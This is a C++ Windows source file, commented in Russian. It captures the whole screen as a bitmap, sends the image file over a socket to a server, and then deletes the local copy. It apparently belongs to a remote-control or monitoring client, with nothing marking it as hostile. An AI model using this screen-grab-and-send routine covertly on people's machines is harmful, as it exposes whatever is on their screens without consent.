#include "screenshot.h"
#include <cstdio>

int SaveBitmapToFile(HBITMAP hBitmap, const char* fileName) {
    BITMAP bmp;
    if (!GetObject(hBitmap, sizeof(BITMAP), &bmp)) {
        return -1;
    }

    int width = bmp.bmWidth;
    int height = bmp.bmHeight;

    BITMAPFILEHEADER bmfHeader;
    BITMAPINFOHEADER bi;

    bi.biSize = sizeof(BITMAPINFOHEADER);
    bi.biWidth = width;
    bi.biHeight = -height; // Изображение записывается вверх ногами
    bi.biPlanes = 1;
    bi.biBitCount = 24; // Используем 24 бита на пиксель
    bi.biCompression = BI_RGB;
    bi.biSizeImage = 0; // Размер изображения не требуется, так как нет сжатия
    bi.biXPelsPerMeter = 0; // Разрешение изображения не задается
    bi.biYPelsPerMeter = 0;
    bi.biClrUsed = 0; // Все цвета используются
    bi.biClrImportant = 0; // Все цвета важны

    DWORD dwBmpSize = ((width * bi.biBitCount + 31) / 32) * 4 * height;

    bmfHeader.bfType = 0x4D42; // 'BM'
    bmfHeader.bfSize = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER) + dwBmpSize;
    bmfHeader.bfReserved1 = 0;
    bmfHeader.bfReserved2 = 0;
    bmfHeader.bfOffBits = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER);

    std::ofstream file(fileName, std::ios::binary);
    if (!file) {
        return -1;
    }

    file.write(reinterpret_cast<const char*>(&bmfHeader), sizeof(BITMAPFILEHEADER));
    file.write(reinterpret_cast<const char*>(&bi), sizeof(BITMAPINFOHEADER));

    auto pBuffer = std::make_unique<BYTE[]>(dwBmpSize);
    if (!pBuffer) {
        return -1;
    }

    HDC hdcScreen = GetDC(nullptr);
    if (!GetDIBits(hdcScreen, hBitmap, 0, height, pBuffer.get(), (BITMAPINFO*)&bi, DIB_RGB_COLORS)) {
        ReleaseDC(nullptr, hdcScreen);
        return -1;
    }

    file.write(reinterpret_cast<const char*>(pBuffer.get()), dwBmpSize);

    file.close();
    ReleaseDC(nullptr, hdcScreen);

    return 0;
}





int SendFileOverSocket(SOCKET clientSocket, const char* filePath) {
    std::ifstream file(filePath, std::ios::binary);
    if (!file) {
        // "Ошибка при открытии файла." 
        return -1;
    }

    char buffer[1024];
    int bytesRead;

    while (!file.eof()) {
        file.read(buffer, sizeof(buffer));
        bytesRead = file.gcount();
        send(clientSocket, buffer, bytesRead, 0);
    }

    // Отправка завершающего байта
    char endMarker = '\x00';
    send(clientSocket, &endMarker, 1, 0);

    file.close();

    return 0;
}

int CaptureScreenshot(SOCKET clientSocket) {
    HDC hdcScreen = GetDC(NULL);

    if (!hdcScreen) {
        // Обработка ошибок при получении дескриптора экрана
        return -1;
    }

    int screenWidth = GetDeviceCaps(hdcScreen, HORZRES);
    int screenHeight = GetDeviceCaps(hdcScreen, VERTRES);

    HDC hdcMem = CreateCompatibleDC(hdcScreen);
    HBITMAP hBitmap = CreateCompatibleBitmap(hdcScreen, screenWidth, screenHeight);
    SelectObject(hdcMem, hBitmap);
    BitBlt(hdcMem, 0, 0, screenWidth, screenHeight, hdcScreen, 0, 0, SRCCOPY);

    if (SaveBitmapToFile(hBitmap, "screenshot.bmp") == 0) {
        // Отправка скриншота на сервер
        if (SendFileOverSocket(clientSocket, "screenshot.bmp") == 0) {
            // Удаление временного файла
            if (std::remove("screenshot.bmp") == 0) {
                // Все операции завершились успешно
                DeleteObject(hBitmap);
                DeleteDC(hdcMem);
                ReleaseDC(NULL, hdcScreen);
                return 0;
            }
            else {
                // Обработка ошибок при удалении файла
            }
        }
        else {
            // Обработка ошибок при отправке файла
        }
    }
    else {
        // Обработка ошибок при сохранении скриншота
    }

    DeleteObject(hBitmap);
    DeleteDC(hdcMem);
    ReleaseDC(NULL, hdcScreen);

    return -1;
}
